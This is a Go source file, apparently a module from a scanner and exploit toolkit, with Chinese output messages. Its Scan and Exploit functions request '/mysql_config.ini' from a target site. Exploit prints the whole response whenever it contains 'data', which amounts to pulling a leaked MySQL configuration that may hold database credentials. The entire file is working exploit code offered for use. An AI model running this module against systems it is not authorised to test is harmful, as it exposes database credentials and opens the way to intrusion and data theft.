package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wo08 struct {
}

func (s *Wo08) Scan(targetUrl string) {
	vulnerable, err := Wo08scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo08] 存在mysql_config 数据库信息泄露")
	} else {
		color.White("[Wo08] 不存在mysql_config 数据库信息泄露")
	}
}

func (*Wo08) Exploit(targetUrl string) {
	runResult, err := Wo08runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo08scancore(targetUrl string) (bool, error) {
	url := "/mysql_config.ini"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "data") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo08runcore(targetUrl string) (string, error) {
	url := "/mysql_config.ini"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "data") {
		return "存在mysql_config 数据库信息泄露\n" + resContent, nil
	} else {
		return "", nil
	}
}
